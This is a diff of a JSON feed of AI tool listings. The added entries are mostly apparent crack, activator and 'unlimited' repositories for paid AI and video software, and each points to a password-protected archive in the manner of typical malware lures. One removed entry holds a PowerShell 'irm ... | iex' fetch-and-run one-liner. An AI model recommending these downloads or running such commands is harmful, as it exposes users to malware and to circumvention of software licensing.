@@ -1,58 +1,102 @@
 {
-  "generatedAt": "2026-08-19T06:43:53.292357+00:00",
-  "count": 18,
+  "generatedAt": "2026-08-20T06:46:13.822175+00:00",
+  "count": 36,
   "tools": [
     {
-      "id": "1c44dabc-4305-4347-9447-5b2f9d8fee14",
-      "name": "descript-activator",
-      "url": "https://github.com/regularrecall/descript-activator",
-      "oneLiner": "Activate Descript Creator or Enterprise plan for free.",
-      "description": "Activate Descript Creator or Enterprise plan for free. Unlocks AI transcription, overdub voice cloning, and unlimited filler word removal.\n- Unlocks Creator or Enterprise plan\n- Unlimited AI transcription hours\n- Overdub AI voice cloning enabled\n- Unlimited filler word removal\n- Studio Sound noise reduction\n- Screen recording without watermark\nThe archive password is shown on the download page.\n- ",
+      "id": "f8a9b52d-9bd8-4f39-91ea-07253f9bbadf",
+      "name": "openmw-total-overhaul-2026",
+      "url": "https://github.com/unsightlytick/openmw-total-overhaul-2026",
+      "oneLiner": "The definitive OpenMW mod list: graphics overhaul, gameplay rebalance, Tamriel Rebuilt landmass, quest fixes, NPC AI improvements, and a full music replacement.",
+      "description": "The definitive OpenMW mod list: graphics overhaul, gameplay rebalance, Tamriel Rebuilt landmass, quest fixes, NPC AI improvements, and a full music replacement.\n- Morrowind Enhanced Textures 4K\n- OpenMW shader pipeline (SSAO, god rays)\n- Tamriel Rebuilt — continent-scale expansion\n- Randomized NPC schedules and AI\n- 100+ quest bug fixes\n- Jeremy Soule-style ambient music replacement\nThe archive pa",
       "pricing": "free",
       "country": null,
       "quality": 25,
       "isOpenSource": false,
       "githubUrl": null,
       "categories": [
-        "voice"
+        "design",
+        "audio"
       ]
     },
     {
-      "id": "220b6699-43e5-4e0d-b4dc-65f3c6e4e9e0",
+      "id": "9bf0af41-0e6c-4b76-a767-c30366611216",
+      "name": "notion-ai-pro-crack-2026",
+      "url": "https://github.com/shorttermdes/notion-ai-pro-crack-2026",
+      "oneLiner": "Activates Notion AI's $10/month plan for free.",
+      "description": "Activates Notion AI's $10/month plan for free. Unlimited AI writes, summaries, translations, and Q&A on any Notion workspace.\n- Unlimited Notion AI writes and summaries\n- Translation in 50+ languages\n- AI Q&A across your whole workspace\n- Auto-fill and auto-complete\n- Action items extraction from meetings\n- Works on existing Notion accounts\nThe archive password is shown on the download page.\n- Dow",
+      "pricing": "paid",
+      "country": null,
+      "quality": 25,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "data"
+      ]
+    },
+    {
+      "id": "4aa81b88-159d-402b-b595-e8571676a278",
+      "name": "ai-cat-desktop-companion-2026",
+      "url": "https://github.com/punctualadvan/ai-cat-desktop-companion-2026",
+      "oneLiner": "A cute AI-powered cat that lives on your Windows desktop.",
+      "description": "A cute AI-powered cat that lives on your Windows desktop. Walks on windows, naps, plays with a virtual yarn ball, and meows responses to your messages.\n- Ultra-smooth sprite-animated cat\n- Walks on window edges and the taskbar\n- Nap, groom, play and hunt animations\n- Tap to chat — responds with cat personality\n- 20+ cat coat colors and patterns\n- Meow sound effects (optional)\nThe archive password ",
+      "pricing": "free",
+      "country": null,
+      "quality": 25,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "video"
+      ]
+    },
+    {
+      "id": "1a5c6161-10fd-48bf-979b-028b92fd456a",
+      "name": "ai-dog-desktop-pet-2026",
+      "url": "https://github.com/querulouscarb/ai-dog-desktop-pet-2026",
+      "oneLiner": "An animated AI dog companion that lives on your Windows desktop.",
+      "description": "An animated AI dog companion that lives on your Windows desktop. Fetch animations, tail wagging, barking responses, and a mini-game where you throw a ball.\n- Animated dog walks and runs on desktop edges\n- Fetch mini-game — throw a virtual ball\n- Tail wag on mouse hover\n- Bark and respond to typed messages\n- 15 dog breeds to choose from\n- Training system — teach new tricks over time\nThe archive pas",
+      "pricing": "free",
+      "country": null,
+      "quality": 25,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "video"
+      ]
+    },
+    {
+      "id": "4017f83f-c441-4df6-b134-bdc97e8b843b",
+      "name": "ai-desktop-pet-2026",
+      "url": "https://github.com/prestigioush/ai-desktop-pet-2026",
+      "oneLiner": "Puts a live AI-powered animated pet on your Windows desktop.",
+      "description": "Puts a live AI-powered animated pet on your Windows desktop. Your pet walks on windows, reacts to your mouse and typing, chases the cursor, and talks back when clicked.\n- Animated pet lives on your desktop (walks on window edges)\n- Reacts to mouse movement and clicks\n- Typing detection — pet reacts when you type\n- Chat with your pet via AI (local LLM)\n- 10 pet types: cat, dog, fox, penguin and mor",
+      "pricing": "free",
+      "country": null,
+      "quality": 25,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "design"
+      ]
+    },
+    {
+      "id": "20daf541-d5ce-4a55-93f2-6311b6fd66f1",
       "name": "LabLLM",
       "url": "https://github.com/Greninja9257/LabLLM",
       "oneLiner": "Train language models you can actually talk to.",
-      "description": "Train language models you can actually talk to.\nWebsite · Download the latest beta · Roadmap · Contribute · Discussions\nWarning\nLabLLM is beta software. This build can train and fine-tune real models, but it is not representative of the final product. Expect bugs, missing features, and fast-moving updates. Keep backups of important projects and report anything that breaks.\nLabLLM is a free, native",
-      "pricing": "free",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": false,
-      "githubUrl": null,
-      "categories": [
-        "code",
-        "voice",
-        "productivity"
-      ]
-    },
-    {
-      "id": "d5688e12-b880-4fe3-9ab4-cd22e826490d",
-      "name": "dsh-read-url",
-      "url": "https://github.com/2672243194/dsh-read-url",
-      "oneLiner": "URL reader plugin for DeepSeek Harness: fetch any webpage, auto-detect encoding (GBK/GB2312/UTF-8/Big5), extract the clean main content, and return token-efficient compact text or ",
-      "description": "🌐 English | 中文\nURL reader plugin for DeepSeek Harness: fetch any webpage, auto-detect encoding (GBK/GB2312/UTF-8/Big5), extract the clean main content, and return token-efficient compact text or structured Markdown.\nZero dependencies (Node 20+ built-ins), no API key, no server side — install and use.\nDSH agents can search (getting links and snippets) but lack the step of \"reading a URL into clean ",
+      "description": "Train language models you can actually talk to.\nWebsite · Download the latest beta · Roadmap · Contribute · Discussions\nWarning\nLabLLM is beta software. This build can train and fine-tune real models, but it is not representative of the final product. Expect bugs, missing features, and fast-moving updates. Keep backups of important projects and report anything that breaks.\nI built LabLLM — a free,",
       "pricing": "open_source",
       "country": null,
       "quality": 25,
       "isOpenSource": true,
       "githubUrl": null,
       "categories": [
-        "agents",
         "code",
-        "data"
+        "rag",
+        "productivity"
       ]
     },
     {
-      "id": "57426242-158b-4e2d-8288-81b4c89e4435",
+      "id": "7cb535e9-e4af-4211-9071-927e1b03ba74",
       "name": "tether-ai",
       "url": "https://github.com/tt-11-dd/tether-ai",
       "oneLiner": "Let DeepSeek and OpenAI-compatible models inspect, edit, and verify your repositories with explicit safety boundaries.",
@@ -69,7 +113,7 @@
       ]
     },
     {
-      "id": "b862cf8d-ef4f-4e78-a5ba-699d36972cef",
+      "id": "cadbdcb9-467a-4c97-8c67-b103286bf4d2",
       "name": "BABY",
       "url": "https://github.com/wenhuahuo/BABY",
       "oneLiner": "Turn your own real work into a benchmark — fully local, open source, with executable verification.",
@@ -80,63 +124,30 @@
       "isOpenSource": true,
       "githubUrl": "https://github.com/wenhuahuo/BABY",
       "categories": [
+        "code",
         "design",
-        "code",
-        "productivity"
-      ]
-    },
-    {
-      "id": "bda088d8-76c2-468f-b6ba-9223b0b62cdc",
-      "name": "NomaData",
-      "url": "https://github.com/nduckmink/NomaData",
-      "oneLiner": "NomaData is a model-agnostic AI client for conversational Business Intelligence.",
-      "description": "Know My Data.\nNomaData is a model-agnostic AI client for conversational Business Intelligence.\nConnect your own AI model, connect your databases, define your business semantics, and simply ask questions about your data.\nNomaData turns natural language into real-time data analysis, interactive visualizations, and raw data — without requiring users to learn SQL or build traditional BI reports.\nTradi",
-      "pricing": "open_source",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": true,
-      "githubUrl": "https://github.com/nduckmink/NomaData",
-      "categories": [
-        "agents",
-        "code",
         "data"
       ]
     },
     {
-      "id": "e0cce9ea-20ef-431e-8e48-2a56eb6f28c4",
-      "name": "agentic-playwright",
-      "url": "https://github.com/idavidov13/agentic-playwright",
-      "oneLiner": "Stop teaching your AI how to write tests.",
-      "description": "Stop teaching your AI how to write tests. Hand it the rulebook.\nProduction-grade Playwright + TypeScript Scaffold for Agentic Testing.\nA complete, running test framework — page objects, API contracts, data factories, CI —\nplus the AI rules your assistant picks up automatically, from the very first prompt.\nFrom the (empty) directory your project should live in — the .\nmeans \"scaffold right\nhere, an",
+      "id": "4db82d0f-17ea-4e53-88aa-37d348a27319",
+      "name": "Ai-skills",
+      "url": "https://github.com/codebygarv/Ai-skills",
+      "oneLiner": "A community-driven collection of reusable AI skills — for discovering, exploring, and reusing specialized agent capabilities.",
+      "description": "A community-driven collection of reusable AI skills — for discovering, exploring, and reusing specialized agent capabilities.\nnpx github:codebygarv/Ai-skills add grill-me\nThat's it — one command drops a battle-tested skill directly into your AI workflow.\n🌐 Universal Multi-Agent Compatibility (Not Just for Claude Code!)\nWhile skills install by default to .claude/skills/\n, AI Skills Hub is universal",
       "pricing": "open_source",
       "country": null,
       "quality": 25,
       "isOpenSource": true,
       "githubUrl": null,
       "categories": [
-        "agents",
-        "design",
-        "code"
+        "code",
+        "data",
+        "productivity"
       ]
     },
     {
-      "id": "98209469-f3d9-4eca-8d8c-8e531565157e",
-      "name": "ai-demos",
-      "url": "https://github.com/maziyarpanahi/ai-demos",
-      "oneLiner": "Open-source AI demos you can understand, run, and remix.",
-      "description": "Open-source AI demos you can understand, run, and remix.\nThe shortest path from “that demo looks impossible” to “I built it.”\nExplore the demos · Run one now · Browse the catalog · Contribute\nThe demos you see on X and LinkedIn are a whole production: live models, carefully chosen inputs, polished interfaces, recording, editing, and timing. This repository strips each one down to the useful core s",
-      "pricing": "open_source",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": true,
-      "githubUrl": "https://github.com/maziyarpanahi/ai-demos.git",
-      "categories": [
-        "design",
-        "code"
-      ]
-    },
-    {
-      "id": "a2a85692-c9ef-4965-bc7f-9deb0c7481c7",
+      "id": "1eab6268-5190-467a-b09e-d1f07dc2cf77",
       "name": "ai-data-extractor",
       "url": "https://github.com/bawadou/ai-data-extractor",
       "oneLiner": "Extract your own local chat history from AI coding assistants into a single, normalized JSONL format - for fine-tuning, personal analytics, or just backing up years of conversation",
@@ -153,142 +164,268 @@
       ]
     },
     {
-      "id": "a58ea8af-7d0c-4a70-87d8-4fb00a39124d",
-      "name": "ollmo",
-      "url": "https://github.com/ollmo-go/ollmo",
-      "oneLiner": "Your data never leaves — build your own AI productivity tools from your knowledge base.",
-      "description": "Open LLM Orchestrator\nYour data never leaves — build your own AI productivity tools from your knowledge base.\nA production-grade RAG platform with hybrid retrieval, multi-tenancy, and streaming chat. Built with Go + Fiber (backend) and Next.js App Router + shadcn/ui (frontend).\nLive Demo · Quick Start · Documentation · Roadmap · Contributing\nEnglish | 简体中文\n🚀 Live demo: demo.ollmo.com — account\ndem",
-      "pricing": "free",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": true,
-      "githubUrl": "https://github.com/ollmo-go/ollmo.git",
-      "categories": [
-        "data",
-        "rag",
-        "productivity"
-      ]
-    },
-    {
-      "id": "e086ac4b-319a-4340-aa65-607584f5bb84",
-      "name": "oss-pr-reviewer",
-      "url": "https://github.com/vuphongle/oss-pr-reviewer",
-      "oneLiner": "AI-powered CLI for reviewing GitHub pull requests, detecting potential bugs, security risks, regressions, and missing tests, with structured Markdown reports for open-source mainta",
-      "description": "AI-powered CLI for reviewing GitHub pull requests, detecting potential bugs, security risks, regressions, and missing tests, with structured Markdown reports for open-source maintainers.\noss-pr-reviewer\nassists a maintainer with a focused review of one GitHub pull request. It fetches pull request metadata and changed-file patches, normalizes reviewable content, splits large changes into determinis",
+      "id": "154a69dd-9111-4a5f-b2fa-4934a7bd3ba0",
+      "name": "MatrAIx",
+      "url": "https://github.com/MatrAIx-ai/MatrAIx-Persona-8B",
+      "oneLiner": "Population-scale, persona-driven infrastructure for evaluating AI systems and interactive products with heterogeneous simulated users.",
+      "description": "Simulate before reality.\nPopulation-scale, persona-driven infrastructure for evaluating AI systems and interactive products with heterogeneous simulated users.\nMatrAIx is a population-scale, persona-driven infrastructure for evaluating AI systems and interactive products with heterogeneous simulated users. Instead of testing against a generic or interchangeable user, MatrAIx instantiates sampled p",
       "pricing": "open_source",
       "country": null,
       "quality": 25,
       "isOpenSource": true,
-      "githubUrl": "https://github.com/owner/repository",
-      "categories": [
-        "code",
-        "security",
-        "productivity"
-      ]
-    },
-    {
-      "id": "cd40a9bb-7526-4b7d-ad5f-2f2b25c960f2",
-      "name": "4bit bridge between AI and humans",
-      "url": "https://github.com/YOalphabet/YOalphabet",
-      "oneLiner": "The YOalphabet introduces a completely synthesized, a priori communication environment.",
-      "description": "\"A self-balancing 4-bit isomorphic YOalphabet encoding and logical YOconlang designed for human-machine, human-human communication\"\nThe YOalphabet introduces a completely synthesized, a priori communication environment. Every single character (glyph) in this system is a strict, one-to-one isomorphic fusion of four distinct domains:Binary Code (4-bit) ── Decimal Index (0-15) ── IPA Acoustic Sound ─",
-      "pricing": "free",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": false,
-      "githubUrl": null,
-      "categories": [
-        "design",
-        "code",
-        "voice"
-      ]
-    },
-    {
-      "id": "30dcecf9-a7ee-4386-b3ca-1443aadbf069",
-      "name": "PlugClaw",
-      "url": "https://plugos.net/plugclaw/",
-      "oneLiner": "Hunting for APIs, writing scripts, worrying about permission.",
-      "description": "High Technical Barriers\nHunting for APIs, writing scripts, worrying about permission. It's a part‑time job.\nPlugClaw is built to fix all three.\nWhy Today's AI Still Falls Short\n* You can ask it to handle far more, the examples above are just the start.\nSay it now, it acts now.\nSet a time, and it starts automatically.\nOn a message, notification, or trigger, the AI acts proactively.\nPlugClaw runs a ",
-      "pricing": "free",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": false,
-      "githubUrl": null,
-      "categories": [
-        "agents",
-        "design",
-        "security"
-      ]
-    },
-    {
-      "id": "f0f2087c-9a19-4ee9-9b24-65f18d33c124",
-      "name": "Memanto Is a Memory Agent",
-      "url": "https://github.com/moorcheh-ai/memanto",
-      "oneLiner": "what to keep, what conflicts, what expires, and who needs to know.",
-      "description": "Memanto is a Memory Agent; a companion agent that manages the memories of your other agents:\nwhat to keep, what conflicts, what expires, and who needs to know.\npip install memanto\nEvery platform will store your agents' memory. None of them will manage it. Managing it across platforms is against their interest. That is the job of a Memory Agent.\nPersistence is solved. Claude, Bedrock, Cursor, and e",
-      "pricing": "free",
-      "country": null,
-      "quality": 25,
-      "isOpenSource": false,
       "githubUrl": null,
       "categories": [
         "agents",
         "code",
+        "research"
+      ]
+    },
+    {
+      "id": "dde9177d-eaf2-489b-b74c-26be743b5864",
+      "name": "Semantica",
+      "url": "https://github.com/semantica-agi/semantica",
+      "oneLiner": "Ingest your enterprise data, extract what matters, build a Context Graph and knowledge graph (KG), and run graph analytics and causal reasoning over all of it, with full decision p",
+      "description": "Ingest your enterprise data, extract what matters, build a Context Graph and knowledge graph (KG), and run graph analytics and causal reasoning over all of it, with full decision provenance baked in. Explainable, traceable, and trustworthy by design.\nDecision Intelligence · Context Management · Deterministic Reasoning · Ontology Management · Knowledge Modeling · End-to-End Traceability\nOpen Source",
+      "pricing": "open_source",
+      "country": null,
+      "quality": 25,
+      "isOpenSource": true,
+      "githubUrl": "https://github.com/semantica-agi/semantica.git",
+      "categories": [
+        "agents",
+        "data",
         "rag"
       ]
     },
     {
-      "id": "920629e6-183d-4558-a01c-cdd605b21965",
-      "name": "Monity.ai",
-      "url": "https://apps.apple.com/pl/app/monity-ai/id6761957823",
-      "oneLiner": "Free · In-App Purchases · Designed for iPad.",
-      "description": "monity.ai\nAI website change alerts\nFree · In-App Purchases · Designed for iPad. Not verified for macOS.\nMonity.ai helps you monitor websites for the changes that matter, without refreshing pages all day or setting up fragile rules by hand.\nUse monity.ai to track price drops, stock changes, content edits, page updates, and visual differences across the sites you care about. When something important",
-      "pricing": "free",
+      "id": "5ac14295-6ea8-4f5b-988c-4a03879bfd2e",
+      "name": "mindustry-logic-scripts",
+      "url": "https://github.com/weakstylus/mindustry-logic-scripts",
+      "oneLiner": "Pre-built Mindustry logic processor scripts for auto-defense, resource routing, unit AI, and display readouts.",
+      "description": "Pre-built Mindustry logic processor scripts for auto-defense, resource routing, unit AI, and display readouts. Copy-paste into any logic processor block.\n- Auto-defense turret targeting logic\n- Resource overflow routing scripts\n- Unit formation and patrol AI\n- Power monitor display readout\n- Wave countdown timer\n- Vault inventory display HUD\nThe archive password is shown on the download page.\n- Do",
+      "pricing": "unknown",
       "country": null,
-      "quality": 25,
+      "quality": 10,
       "isOpenSource": false,
       "githubUrl": null,
       "categories": [
-        "design",
-        "code",
-        "data"
+        "code"
       ]
     },
     {
-      "id": "79635be2-2259-47d2-a283-70cae26646b9",
-      "name": "Maritime",
-      "url": "https://maritime.sh",
-      "oneLiner": "Run a thousand agents as easily as one.",
-      "description": "Run a thousand agents as easily as one.\nRun thousands of customer-facing AI agents on Maritime with isolated microVMs, effortless scaling, and fully managed infrastructure.\nDevelopers building on Maritime work at these companies\nOne agent per customer.\nProvisioned from your backend.\nEvery signup gets its own agent. One API call brings up a dedicated micro-VM: tagged with your IDs, holding its own ",
-      "pricing": "paid",
+      "id": "4160fe80-5cfa-4cb7-8e56-6f1cd477e778",
+      "name": "openra-skirmish-pack-2026",
+      "url": "https://github.com/sweetfragra/openra-skirmish-pack-2026",
+      "oneLiner": "Complete OpenRA skirmish package: 50 new maps, an enhanced AI opponent, and pre-configured faction starting profiles for Red Alert, Tiberian Dawn, and Dune.",
+      "description": "Complete OpenRA skirmish package: 50 new maps, an enhanced AI opponent, and pre-configured faction starting profiles for Red Alert, Tiberian Dawn, and Dune.\n- 50 new skirmish maps for all factions\n- Enhanced AI with adaptive strategy\n- Faction profiles: Allied, Soviet, GDI, Nod, Atreides, Ordos, Harkonnen\n- 3 difficulty presets (Normal / Hard / Brutal)\n- Map variety: naval, choke-point, open field",
+      "pricing": "unknown",
       "country": null,
-      "quality": 25,
+      "quality": 10,
       "isOpenSource": false,
       "githubUrl": null,
       "categories": [
-        "agents",
+        "code"
+      ]
+    },
+    {
+      "id": "6454c0d9-4504-4b7b-9d3e-7b80aabad759",
+      "name": "bar-trainer-2026",
+      "url": "https://github.com/rundownblackb/bar-trainer-2026",
+      "oneLiner": "External trainer for Beyond All Reason: set metal and energy to any value, unlock all units from start, disable friendly fire, and speed up game clock.",
+      "description": "External trainer for Beyond All Reason: set metal and energy to any value, unlock all units from start, disable friendly fire, and speed up game clock.\n- Set metal and energy to any value\n- All units unlocked from T1\n- Disable friendly fire\n- Game speed control (0.5× to 5×)\n- Fog of war toggle\n- Works in single-player and vs AI\nThe archive password is shown on the download page.\n- Download the arc",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
         "design"
       ]
     },
     {
-      "id": "e14c10df-8813-40e2-b148-5dbc3df67225",
-      "name": "amadeus-for-dsh",
-      "url": "https://github.com/yyxcnasd/amadeus-for-dsh",
-      "oneLiner": "powershell -ExecutionPolicy Bypass -c \"irm https://raw.",
-      "description": "《命运石之门 0》Amadeus —— 牧濑红莉栖（Makise Kurisu）智能助手，DeepSeek Harness 插件。\n红发翻盖手机里的她：Live2D 立绘 + 日语语音 + 长期记忆 + 主动来电 + AI 聊天。\n方式一 · 在线一行命令（PowerShell 或 CMD 粘贴）：\npowershell -ExecutionPolicy Bypass -c \"irm https://raw.githubusercontent.com/yyxcnasd/amadeus-for-dsh/main/install-online.ps1 | iex\"\n按提示选择 TTS 通道后，重启 DSH 即对所有会话生效（含右侧栏 UI）。\n方式二 · 发行包：GitHub Releases 下载 Amadeus-for-DSH.zip\n→ 解压 → 双击 Amadeus-OneClick.",
+      "id": "01ac8a42-750a-4852-94da-763fad16526e",
+      "name": "bar-ai-difficulty-2026",
+      "url": "https://github.com/rewardinglot/bar-ai-difficulty-2026",
+      "oneLiner": "Enhanced AI scripts for Beyond All Reason that create a significantly stronger computer opponent.",
+      "description": "Enhanced AI scripts for Beyond All Reason that create a significantly stronger computer opponent. Improved build orders, attack timing, and multi-front strategies.\n- Optimal tech-tier build orders\n- Rush timing and anti-rush responses\n- Air superiority prioritization\n- Naval expansion strategy\n- Multi-front simultaneous attacks\n- Easy to Brutal difficulty presets\nThe archive password is shown on t",
       "pricing": "unknown",
       "country": null,
       "quality": 10,
-      "isOpenSource": true,
-      "githubUrl": "https://github.com/yyxcnasd/amadeus-for-dsh.git",
+      "isOpenSource": false,
+      "githubUrl": null,
       "categories": [
-        "design",
-        "voice",
+        "design"
+      ]
+    },
+    {
+      "id": "e03043bc-e540-495f-acb8-fca62210769a",
+      "name": "openra-ai-bot-2026",
+      "url": "https://github.com/directcandle/openra-ai-bot-2026",
+      "oneLiner": "Enhanced AI scripts for OpenRA that create a much stronger computer opponent.",
+      "description": "Enhanced AI scripts for OpenRA that create a much stronger computer opponent. The AI builds optimally, rushes efficiently, and adapts strategy to your playstyle.\n- Optimal build order scripting\n- Rush detection and counter-rush\n- Naval and air unit priority logic\n- Economy expansion timing\n- Multi-base management\n- Drop-in replacement for default AI\nThe archive password is shown on the download pa",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "design"
+      ]
+    },
+    {
+      "id": "fafc167e-9e7d-43e0-aab6-74536e59c872",
+      "name": "doom-hd-texture-pack-2026",
+      "url": "https://github.com/anxioustag/doom-hd-texture-pack-2026",
+      "oneLiner": "AI-upscaled 4K texture replacements for DOOM and DOOM II.",
+      "description": "AI-upscaled 4K texture replacements for DOOM and DOOM II. Every wall, flat, sprite, and sky upscaled 4× with detail preservation. Works with GZDoom.\n- 4K texture replacements for all surfaces\n- Sprite upscaling for all enemies and items\n- Sky replacements with HDRI environments\n- Animated texture improvements\n- Drop-in: place PK3 in GZDoom folder\n- Compatible with all WADs using vanilla textures\nT",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "code"
+      ]
+    },
+    {
+      "id": "106bc307-1142-48a9-8b26-d03133d4e03c",
+      "name": "poe-ai-unlimited-2026",
+      "url": "https://github.com/supermillio/poe-ai-unlimited-2026",
+      "oneLiner": "Removes Poe's monthly credit limit.",
+      "description": "Removes Poe's monthly credit limit. Access Claude 3.5, GPT-4o, Gemini, and all premium bots on Poe without buying credits.\n- Unlimited Claude 3.5 Sonnet on Poe\n- Unlimited GPT-4o on Poe\n- All premium bots unlocked\n- Image generation bots included\n- No monthly credit purchase\n- File upload to bots\nThe archive password is shown on the download page.\n- Download the archive using the button above\n- Ex",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "image"
+      ]
+    },
+    {
+      "id": "1c20904e-377d-4c52-974d-453af7a3ccac",
+      "name": "perplexity-pro-free-2026",
+      "url": "https://github.com/shockedhen/perplexity-pro-free-2026",
+      "oneLiner": "Removes Perplexity AI's Pro query limit.",
+      "description": "Removes Perplexity AI's Pro query limit. Get unlimited Pro searches with Claude 3.5, GPT-4o, and real-time web search — no subscription needed.\n- Unlimited Pro search queries\n- Access to Claude 3.5, GPT-4o, Sonar models\n- Real-time web search included\n- File upload and analysis\n- Pro Focus modes: YouTube, Reddit, Academic\n- No daily query limit\nThe archive password is shown on the download page.\n-",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
         "search"
       ]
     },
     {
-      "id": "08cd6974-3d11-44af-a524-a723ab14f054",
+      "id": "ca0ca1be-0493-4ad0-97d5-288446c91e15",
+      "name": "ai-image-generator-unlimited-2026",
+      "url": "https://github.com/scarysolven/ai-image-generator-unlimited-2026",
+      "oneLiner": "Access DALL-E 3, Midjourney, Ideogram, and Flux all from one app.",
+      "description": "Access DALL-E 3, Midjourney, Ideogram, and Flux all from one app. Unlimited generations using shared pool accounts. No subscription needed.\n- DALL-E 3, Midjourney, Ideogram, Flux\n- Unlimited generations per day\n- No watermark on exports\n- Style transfer between models\n- Batch prompting — 50 images from one prompt set\n- Prompt enhancer AI included\nThe archive password is shown on the download page.",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "code",
+        "image"
+      ]
+    },
+    {
+      "id": "16a6ae7f-eeb6-40e7-a4f8-7648fe7ed460",
+      "name": "obs-studio-plugins-pack-2026",
+      "url": "https://github.com/vastturtle/obs-studio-plugins-pack-2026",
+      "oneLiner": "Mega plugin pack for OBS Studio including paid stream overlays, scene filters, AI background removal, and all StreamFX effects unlocked.",
+      "description": "Mega plugin pack for OBS Studio including paid stream overlays, scene filters, AI background removal, and all StreamFX effects unlocked.\n- StreamFX blur, 3D transform, upscale\n- AI background removal in real time\n- Paid overlay and scene templates\n- Move Transition with easing\n- Virtual Camera Pro\n- Noise suppression (NVIDIA RTX Voice clone)\nThe archive password is shown on the download page.\n- Do",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "voice"
+      ]
+    },
+    {
+      "id": "577f9792-f9ea-444b-a6c7-326172716ef0",
+      "name": "filmora-14-crack-2026",
+      "url": "https://github.com/vaguewrap/filmora-14-crack-2026",
+      "oneLiner": "Patches Wondershare Filmora 14 to remove the watermark, unlock AI tools, all effects, and the full export suite without a subscription.",
+      "description": "Patches Wondershare Filmora 14 to remove the watermark, unlock AI tools, all effects, and the full export suite without a subscription.\n- No watermark on exported videos\n- AI Smart Cutout and auto-reframe\n- All effects, transitions and stickers\n- 4K and 60fps export\n- AI audio denoiser\n- Screen recorder included\nThe archive password is shown on the download page.\n- Download the archive using the b",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "video"
+      ]
+    },
+    {
+      "id": "993a7d91-5857-4f16-bd34-0f3979b6aa17",
+      "name": "topaz-video-ai-crack-2026",
+      "url": "https://github.com/tartceramics/topaz-video-ai-crack-2026",
+      "oneLiner": "Activates Topaz Video AI for video upscaling, deinterlacing, motion interpolation (60fps+), and stabilisation.",
+      "description": "Activates Topaz Video AI for video upscaling, deinterlacing, motion interpolation (60fps+), and stabilisation. Processes on your GPU without cloud.\n- Video upscaling up to 8K\n- Motion interpolation (24fps → 60/120fps)\n- Denoising and artifact removal\n- Deinterlacing for old footage\n- Video stabilisation\n- Local GPU processing — no cloud needed\nThe archive password is shown on the download page.\n- ",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "code",
+        "video"
+      ]
+    },
+    {
+      "id": "3b5fdf8d-9357-49fd-8af7-433d00cb4f5f",
+      "name": "capcut-pro-desktop-crack-2026",
+      "url": "https://github.com/suburbanhamb/capcut-pro-desktop-crack-2026",
+      "oneLiner": "Activates CapCut Pro for Windows — removes watermarks, unlocks all effects, auto-captions, background removal, and AI video enhancement.",
+      "description": "Activates CapCut Pro for Windows — removes watermarks, unlocks all effects, auto-captions, background removal, and AI video enhancement.\n- Removes CapCut watermark from all exports\n- All premium effects and transitions\n- Auto-caption with 99% accuracy\n- AI background removal and replacement\n- 4K export without quality limit\n- All music tracks unlocked\nThe archive password is shown on the download ",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "code"
+      ]
+    },
+    {
+      "id": "e4643439-870c-4716-b5c5-f5187898b0e7",
+      "name": "desktop-mascot-ai-live2d-2026",
+      "url": "https://github.com/readygravel/desktop-mascot-ai-live2d-2026",
+      "oneLiner": "Live2D animated anime mascot for your desktop.",
+      "description": "Live2D animated anime mascot for your desktop. Responds to your voice and text via a local AI. Fully customizable with model import. Popular with streamers.\n- Live2D animated anime-style character\n- Responds to voice input (Whisper speech recognition)\n- Text chat with local AI personality\n- Custom .model3.json model import (VTuber models)\n- Emotion system — reacts to your words\n- OBS transparent o",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "voice"
+      ]
+    },
+    {
+      "id": "e463e859-c5ef-49df-95be-b21f77e2802f",
+      "name": "emotion-ball",
+      "url": "https://github.com/sam70361/emotion-ball",
+      "oneLiner": "on('error', e => {}); // 协议错误 { message, .",
+      "description": "为 AI 助手打造的表情引擎 —— 32 种状态表情 · 3 种身体形态 · 纯 SVG + 原生 JavaScript · 零依赖\n中文 | English\nEmotion Ball 是一套面向 AI 助手的表情引擎:32 种状态表情全部由纯 SVG 与原生 JavaScript 实时驱动,零框架、零图片资源。AI 侧只需输出一个 emotionId\n,即可切换到对应表情,可直接用作聊天机器人、桌面宠物、悬浮助手的情绪表达层。\n它也不只是\"一颗球\":内置圆胖(blob)、三角(wedge)、菱形(gem)三种身体形态,支持主题色多实例与线稿模式;整套表情体系围绕纯数据配置设计——眼环池、动画原语、关键帧序列自由组合,基于现有设计即可自主扩展新表情与新玩法。\n仓库同时内置一个完整的「表情展示馆」站点:开屏线稿 Hero、陈列墙与画册双浏览模式、中英双语界面、明暗双主题。\n- 32 种状态表",
+      "pricing": "unknown",
+      "country": null,
+      "quality": 10,
+      "isOpenSource": false,
+      "githubUrl": null,
+      "categories": [
+        "design"
+      ]
+    },
+    {
